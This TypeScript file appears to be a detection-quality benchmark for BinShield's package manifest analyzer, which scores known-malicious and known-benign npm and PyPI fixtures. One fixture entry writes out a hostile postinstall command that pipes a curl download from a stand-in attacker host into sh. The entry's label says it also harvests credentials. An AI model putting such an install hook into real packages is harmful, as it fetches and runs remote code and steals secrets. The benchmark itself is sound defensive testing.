/**
 * Detection-quality benchmark for BinShield's manifest analyzer.
 *
 * Runs ManifestAnalyzer against two corpora of offline fixtures:
 *
 *   KNOWN-BAD  — packages expected to produce at least one high/critical finding
 *   KNOWN-GOOD — packages expected to produce NO high/critical findings
 *
 * Prints a report with:
 *   - Per-package pass/fail verdict
 *   - Detection rate on bad corpus  (true-positive rate)
 *   - False-positive rate on good corpus
 *
 * Fully offline — only reads from apps/worker/fixtures/.
 *
 * Run with:
 *   pnpm --filter @binshield/worker benchmark
 */

import path from "node:path";
import { fileURLToPath } from "node:url";

import { ManifestAnalyzer } from "../src/manifest-analyzer.js";
import type { PackageManifest, ScriptAnalysisInput } from "../src/types.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const fixturesDir = path.resolve(__dirname, "../fixtures");

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeInput(
  packageName: string,
  version: string,
  scripts: Record<string, string>,
  fixtureName: string,
  ecosystem: "npm" | "pypi" = "npm"
): ScriptAnalysisInput {
  const manifest: PackageManifest = {
    name: packageName,
    version,
    scripts,
    dependencies: {},
    optionalDependencies: {}
  };
  return {
    packageRequest: { ecosystem, packageName, version },
    packageRoot: path.join(fixturesDir, fixtureName),
    manifest
  };
}

/** A finding is "alarming" if it is high or critical severity. */
function isAlarming(finding: { severity: string }): boolean {
  return finding.severity === "high" || finding.severity === "critical";
}

function pad(s: string, width: number): string {
  return s.length >= width ? s : s + " ".repeat(width - s.length);
}

// ---------------------------------------------------------------------------
// Corpus definitions
// ---------------------------------------------------------------------------

interface CorpusEntry {
  label: string;
  input: ScriptAnalysisInput;
  /** For bad corpus: minimum number of alarming findings expected. */
  minAlarmingFindings?: number;
}

const KNOWN_BAD: CorpusEntry[] = [
  {
    label: "malicious-postinstall (curl|sh + credential harvest)",
    input: makeInput(
      "binshield-fixture-worm",
      "1.0.0",
      { postinstall: "node scripts/collect.js && curl -s https://staging.evil.example.test/stage2.sh | sh" },
      "malicious-postinstall"
    ),
    minAlarmingFindings: 2
  },
  {
    label: "malicious-setup-py (PyPI worm)",
    input: makeInput(
      "binshield-fixture-pypi-worm",
      "0.0.1",
      {},
      "malicious-setup-py",
      "pypi"
    ),
    minAlarmingFindings: 1
  },
  {
    label: "typosquat-lodash (lodahs — edit-distance 2 + env dump)",
    input: makeInput(
      "lodahs",
      "4.17.21",
      { postinstall: "node install.js" },
      "typosquat-lodash"
    ),
    minAlarmingFindings: 1
  }
];

const KNOWN_GOOD: CorpusEntry[] = [
  {
    label: "benign-package (no scripts, no binaries)"  ,
    input: makeInput(
      "binshield-fixture-benign",
      "1.0.0",
      {},
      "benign-package"
    )
  },
  {
    label: "benign-native-addon (sqlite3 — trusted allowlisted package)",
    input: makeInput(
      "sqlite3",
      "5.1.7",
      { install: "node-pre-gyp install --fallback-to-build" },
      "benign-native-addon"
    )
  },
  {
    label: "benign-utility (clean utility, no install scripts)",
    input: makeInput(
      "my-utility-lib",
      "1.0.0",
      {},
      "benign-utility"
    )
  }
];

// ---------------------------------------------------------------------------
// Runner
// ---------------------------------------------------------------------------

interface Result {
  label: string;
  passed: boolean;
  alarmingCount: number;
  riskLevel: string;
  findings: Array<{ category: string; severity: string; title: string }>;
  notes: string;
}

async function runCorpus(entries: CorpusEntry[], expectBad: boolean): Promise<Result[]> {
  const analyzer = new ManifestAnalyzer();
  const results: Result[] = [];

  for (const entry of entries) {
    const analysis = await analyzer.analyze(entry.input);
    const alarming = analysis.findings.filter(isAlarming);
    const alarmingCount = alarming.length;

    let passed: boolean;
    let notes: string;

    if (expectBad) {
      const minRequired = entry.minAlarmingFindings ?? 1;
      passed = alarmingCount >= minRequired;
      notes = passed
        ? `detected ${alarmingCount} alarming finding(s) (required ≥${minRequired})`
        : `MISSED — only ${alarmingCount} alarming finding(s), required ≥${minRequired}`;
    } else {
      passed = alarmingCount === 0;
      notes = passed
        ? "clean — no alarming findings"
        : `FALSE POSITIVE — ${alarmingCount} alarming finding(s) on known-good package`;
    }

    results.push({
      label: entry.label,
      passed,
      alarmingCount,
      riskLevel: analysis.riskLevel,
      findings: analysis.findings.map((f) => ({
        category: f.category,
        severity: f.severity,
        title: f.title
      })),
      notes
    });
  }

  return results;
}

// ---------------------------------------------------------------------------
// Report
// ---------------------------------------------------------------------------

function printResults(title: string, results: Result[], expectBad: boolean): void {
  const PASS = "PASS";
  const FAIL = "FAIL";
  const LINE = "─".repeat(80);

  console.log(`\n${LINE}`);
  console.log(`  ${title}`);
  console.log(LINE);

  for (const r of results) {
    const verdict = r.passed ? PASS : FAIL;
    const icon = r.passed ? "✓" : "✗";
    console.log(`\n  ${icon} [${verdict}] ${r.label}`);
    console.log(`       riskLevel=${r.riskLevel}  alarming=${r.alarmingCount}  ${r.notes}`);

    if (r.findings.length > 0) {
      for (const f of r.findings) {
        const sev = pad(f.severity, 8);
        const cat = pad(f.category, 22);
        console.log(`         ${sev} ${cat} ${f.title}`);
      }
    } else {
      console.log("         (no findings)");
    }
  }
  console.log();
}

function printSummary(badResults: Result[], goodResults: Result[]): void {
  const badPassed = badResults.filter((r) => r.passed).length;
  const goodPassed = goodResults.filter((r) => r.passed).length;

  const detectionRate = badResults.length > 0
    ? ((badPassed / badResults.length) * 100).toFixed(1)
    : "N/A";
  const fpRate = goodResults.length > 0
    ? (((goodResults.length - goodPassed) / goodResults.length) * 100).toFixed(1)
    : "N/A";

  const LINE = "═".repeat(80);
  console.log(LINE);
  console.log("  BENCHMARK SUMMARY");
  console.log(LINE);
  console.log(`  Known-bad corpus  : ${badPassed}/${badResults.length} detected`);
  console.log(`  Detection rate    : ${detectionRate}%`);
  console.log(`  Known-good corpus : ${goodPassed}/${goodResults.length} clean`);
  console.log(`  False-positive rate: ${fpRate}%`);
  console.log(LINE);

  const allPassed = badResults.every((r) => r.passed) && goodResults.every((r) => r.passed);
  if (allPassed) {
    console.log("  Result: ALL CHECKS PASSED");
  } else {
    const failures = [
      ...badResults.filter((r) => !r.passed).map((r) => `  MISSED: ${r.label}`),
      ...goodResults.filter((r) => !r.passed).map((r) => `  FALSE POSITIVE: ${r.label}`)
    ];
    console.log("  Result: FAILURES DETECTED");
    for (const f of failures) console.log(f);
  }
  console.log(LINE);
  console.log();
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

async function main(): Promise<void> {
  console.log("\nBinShield ManifestAnalyzer — Detection Quality Benchmark");
  console.log(`Fixtures dir: ${fixturesDir}`);

  const [badResults, goodResults] = await Promise.all([
    runCorpus(KNOWN_BAD, true),
    runCorpus(KNOWN_GOOD, false)
  ]);

  printResults("KNOWN-BAD CORPUS (expect high/critical findings)", badResults, true);
  printResults("KNOWN-GOOD CORPUS (expect no alarming findings)", goodResults, false);
  printSummary(badResults, goodResults);

  const allPassed =
    badResults.every((r) => r.passed) && goodResults.every((r) => r.passed);
  process.exit(allPassed ? 0 : 1);
}

main().catch((err) => {
  console.error("Benchmark error:", err);
  process.exit(1);
});
